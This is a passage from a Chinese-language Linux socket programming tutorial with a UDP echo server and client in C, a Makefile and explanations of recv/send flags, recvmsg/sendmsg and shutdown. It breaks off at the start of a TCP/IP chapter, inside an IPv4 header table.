*/<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ memset(msg, 0, sizeof(msg));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ addrlen = sizeof(struct sockaddr);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ n=recvfrom(sockfd,msg,MAX_MSG_SIZE,0,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ (struct sockaddr*)&amp;addr,&amp;addrlen);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 显示服务端已经收到了信息&nbsp; */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ fprintf(stdout,"I have received %s",msg);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ sendto(sockfd,msg,n,0,(struct sockaddr*)&amp;addr,addrlen);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>}</p>
+<p>int main(void)<br>{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int sockfd;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct sockaddr_in&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; addr;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sockfd=socket(AF_INET,SOCK_DGRAM,0);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(sockfd&lt;0)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ fprintf(stderr,"Socket Error:%s\n",strerror(errno));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bzero(&amp;addr,sizeof(struct sockaddr_in));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; addr.sin_family=AF_INET;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; addr.sin_addr.s_addr=htonl(INADDR_ANY);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; addr.sin_port=htons(SERVER_PORT);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(bind(sockfd,(struct sockaddr *)&amp;addr,sizeof(struct sockaddr_in))&lt;0)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ fprintf(stderr,"Bind Error:%s\n",strerror(errno));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; udps_respon(sockfd);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(sockfd);<br>}</p>
+<p>客户端程序</p>
+<p>CODE:&nbsp; [Copy to clipboard]</p>
+<p><br>--------------------------------------------------------------------------------</p>
+<p>/*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+客户端程
+序&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ */<br>#include &lt;stdlib.h&gt;<br>#include &lt;stdio.h&gt;<br>#include &lt;errno.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;netdb.h&gt;<br>#include &lt;sys/socket.h&gt;<br>#include &lt;netinet/in.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;arpa/inet.h&gt;<br>#define MAX_BUF_SIZE&nbsp;&nbsp;&nbsp; 1024</p>
+<p>void udpc_requ(int sockfd,const struct sockaddr_in *addr,socklen_t len)<br>{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char buffer[MAX_BUF_SIZE];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int n;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while(fgets(buffer,MAX_BUF_SIZE,stdin))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /*&nbsp;&nbsp; 从键盘读入,写到服务端&nbsp;&nbsp; */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ sendto(sockfd,buffer,strlen(buffer),0,addr,len);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bzero(buffer,MAX_BUF_SIZE);</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /*&nbsp;&nbsp; 从网络上读,写到屏幕上&nbsp;&nbsp;&nbsp; */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ memset(buffer, 0, sizeof(buffer));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ n=recvfrom(sockfd,buffer,MAX_BUF_SIZE, 0, NULL, NULL);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(n &lt;= 0)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ fprintf(stderr, "Recv Error %s\n", strerror(errno));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ return;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ buffer[n]=0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fprintf(stderr, "get %s", buffer);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>}</p>
+<p><br>int main(int argc,char **argv)<br>{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int sockfd,port;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct sockaddr_in&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; addr;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(argc!=3)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ fprintf(stderr,"Usage:%s server_ip server_port\n",argv[0]);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if((port=atoi(argv[2]))&lt;0)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ fprintf(stderr,"Usage:%s server_ip server_port\n",argv[0]);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sockfd=socket(AF_INET,SOCK_DGRAM,0);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(sockfd&lt;0)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ fprintf(stderr,"Socket&nbsp; Error:%s\n",strerror(errno));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 填充服务端的资料&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bzero(&amp;addr,sizeof(struct sockaddr_in));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; addr.sin_family=AF_INET;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; addr.sin_port=htons(port);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(inet_aton(argv[1],&amp;addr.sin_addr)&lt;0)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ fprintf(stderr,"Ip error:%s\n",strerror(errno));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ if(connect(sockfd, (struct sockaddr *)&amp;addr, sizeof(struct 
+sockaddr_in)) == -1)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ fprintf(stderr, "connect error %s\n", strerror(errno));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ exit(1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; udpc_requ(sockfd,&amp;addr,sizeof(struct sockaddr_in));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(sockfd);<br>}</p>
+<p>########### 编译文件 Makefile&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ##########<br>all:server client<br>server:server.c<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gcc -o server server.c<br>client:client.c<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gcc -o client client.c<br>clean:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rm -f server<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rm -f client<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rm -f core</p>
+<p>运行UDP Server程序<br>执行./server &amp;命令来启动服务程序。我们可以使用netstat -ln命令来观察服务程序绑定的IP地址和端口，部分输出信息如下：<br>Active Internet connections (only servers)<br>Proto Recv-Q Send-Q Local Address Foreign Address State<br>tcp 0 0 0.0.0.0:32768 0.0.0.0:* LISTEN<br>tcp 0 0 0.0.0.0:111 0.0.0.0:* LISTEN<br>tcp 0 0 0.0.0.0:6000 0.0.0.0:* LISTEN<br>tcp 0 0 127.0.0.1:631 0.0.0.0:* LISTEN<br>udp 0 0 0.0.0.0:32768 0.0.0.0:*<br>udp 0 0 0.0.0.0:8888 0.0.0.0:*<br>udp 0 0 0.0.0.0:111 0.0.0.0:*<br>udp 0 0 0.0.0.0:882 0.0.0.0:*<br>可以看到udp处有“0.0.0.0:8888”的内容，说明服务程序已经正常运行，可以接收主机上任何IP地址且端口为8888的数据。</p>
+<p>3、运行UDP Client程序<br>执行./client 127.0.0.1 8888命令来启动客户程序，使用127.0.0.1来连接服务程序，执行效果如下：<br>Hello, World!<br>Hello, World!<br>this is a test<br>this is a test<br>^d<br>输入的数据都正确从服务程序返回了，按ctrl+d可以结束输入，退出程序。</p>
+<p>(六)Linux网络编程--6. 高级套接字函数</p>
+<p>在前面的几个部分里面,我们已经学会了怎么样从网络上读写信息了.前面的一些函数(read,write)是网络程序里面最基本的函数.<br>也是最原始的通信函数.在这一章里面,我们一起来学习网络通信的高级函数.这一章我们学习另外几个读写函数. </p>
+<p>6.1 recv和send <br>&nbsp; recv和send函数提供了和read和write差不多的功能.不过它们提供 了第四个参数来控制读写操作. </p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int recv(int sockfd,void *buf,int len,int flags)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int send(int sockfd,void *buf,int len,int flags)</p>
+<p>前面的三个参数和read,write一样,第四个参数可以是0或者是以下的组合 <br>_______________________________________________________________<br>|&nbsp;
+ MSG_DONTROUTE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp; 
+不查找路由
+表&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ |<br>|&nbsp; 
+MSG_OOB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ |&nbsp; 
+接受或者发送带外数
+据&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ |<br>|&nbsp; 
+MSG_PEEK&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ |&nbsp; 查看数据,并不从系统缓冲区移走数据&nbsp;&nbsp;&nbsp; |<br>|&nbsp; 
+MSG_WAITALL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+|&nbsp; 
+等待所有数
+据&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ |<br>|---------------------------------------------------------------|</p>
+<p>MSG_DONTROUTE:是send函数使用的标志.这个标志告诉IP协议.目的主机在本地网络上面,没有必要查找路由表.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 这个标志一般用网络诊断和路由程序里面. </p>
+<p>MSG_OOB:表示可以接收和发送带外的数据.关于带外数据我们以后会解释的. </p>
+<p>MSG_PEEK:是recv函数的使用标志,表示只是从系统缓冲区中读取内容,而不清除系统缓冲区的内容.这样下次读的时候,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 仍然是一样的内容.一般在有多个进程读写数据时可以使用这个标志. </p>
+<p>MSG_WAITALL是recv函数的使用标志,表示等到所有的信息到达时才返回.使用这个标志的时候recv回一直阻塞,直到指定的条件满足,或者是发生了错误. <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1)当读到了指定的字节时,函数正常返回.返回值等于len <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2)当读到了文件的结尾时,函数正常返回.返回值小于len <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 3) 当操作发生错误时,返回-1,且设置错误为相应的错误号(errno) </p>
+<p>如果flags为0,则和read,write一样的操作.还有其它的几个选项,不过我们实际上用的很少,<br>可以查看 Linux Programmer's Manual得到详细解释. </p>
+<p>6.2 recvfrom和sendto <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 这两个函数一般用在非套接字的网络程序当中(UDP),我们已经在前面学会了. </p>
+<p>6.3 recvmsg和sendmsg <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; recvmsg和sendmsg可以实现前面所有的读写函数的功能. </p>
+<p>int recvmsg(int sockfd,struct msghdr *msg,int flags)<br>int sendmsg(int sockfd,struct msghdr *msg,int flags)</p>
+<p>&nbsp; struct msghdr<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; void *msg_name;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int msg_namelen;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct iovec *msg_iov;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int msg_iovlen;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; void *msg_control;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int msg_controllen;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int msg_flags;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>
+<p>struct iovec<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; void *iov_base; /* 缓冲区开始的地址&nbsp; */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ size_t iov_len; /* 缓冲区的长度&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; msg_name和 msg_namelen当套接字是非面向连接时(UDP),它们存储接收和发送方的地址信息.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; msg_name实际上是一个指向struct sockaddr的指针,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; msg_namelen是结构的长度.当套接字是面向连接时,这两个值应设为NULL. <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; msg_iov和 msg_iovlen指出接受和发送的缓冲区内容.msg_iov是一个结构指针,msg_iovlen指出这个结构数组的大小.&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; msg_control和msg_controllen这两个变量是用来接收和发送控制数据时的 msg_flags指定接受和发送的操作选项.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 和 recv,send的选项一样 </p>
+<p>6.4 套接字的关闭 <br>关闭套接字有两个函数close和shutdown.用close时和我们关闭文件一样. </p>
+<p>6.5 shutdown </p>
+<p>int shutdown(int sockfd,int howto)&nbsp; </p>
+<p>TCP连接是双向的(是可读写的),当我们使用close时,会把读写通道都关闭,有时侯我们希望只关闭一个方向,这个时候我们可以使用<br>shutdown.针对不同的howto,系统回采取不同的关闭方式. <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; howto=0这个时候系统会关闭读通道.但是可以继续往接字描述符写. <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; howto=1关闭写通道,和上面相反,着时候就只可以读了. <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; howto=2关闭读写通道,和close一样 在多进程程序里面,如果有几个子进程共享一个套接字时,如果我们使用shutdown, <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 那么所有的子进程都不能够操作了,这个时候我们只能够使用close来关闭子进程的套接字描述符.</p>
+<p><br>(七)Linux网络编程--7. TCP/IP协议</p>
+<p>你也许听说过TCP/IP协议,那么你知道到底什么是TCP,什么是IP吗?在这一章里面,我们一起来学习这个目前网络上用最广泛的协议. </p>
+<p>7.1 网络传输分层 <br>&nbsp;&nbsp;&nbsp; 如果你考过计算机等级考试,那么你就应该已经知道了网络传输分层这个概念.在网络上,人们为了传输数据时的方便,<br>&nbsp;&nbsp;&nbsp; 把网络的传输分为7个层次.分别是:应用层,表示层,会话层,传输层,网络层,数据链路层和物理层.分好了层以后,传输数据时,<br>&nbsp;&nbsp;&nbsp; 上一层如果要数据的话,就可以直接向下一层要了,而不必要管数据传输的细节.下一层也只向它的上一层提供数据,<br>&nbsp;&nbsp;&nbsp; 而不要去管其它东西了.如果你不想考试,你没有必要去记这些东西的.只要知道是分层的,而且各层的作用不同. </p>
+<p>7.2 IP协议 <br>&nbsp;&nbsp;&nbsp; IP协议是在网络层的协议.它主要完成数据包的发送作用. 下面这个表是IP4的数据包格式 </p>
+<p>0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+16&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 32<br>--------------------------------------------------<br>|版本&nbsp;&nbsp; |首部长度|服务类型|&nbsp;&nbsp;&nbsp; 数据包总长&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<br>--------------------------------------------------<br>|&nbsp;&nbsp;&nbsp;
+ 
+标
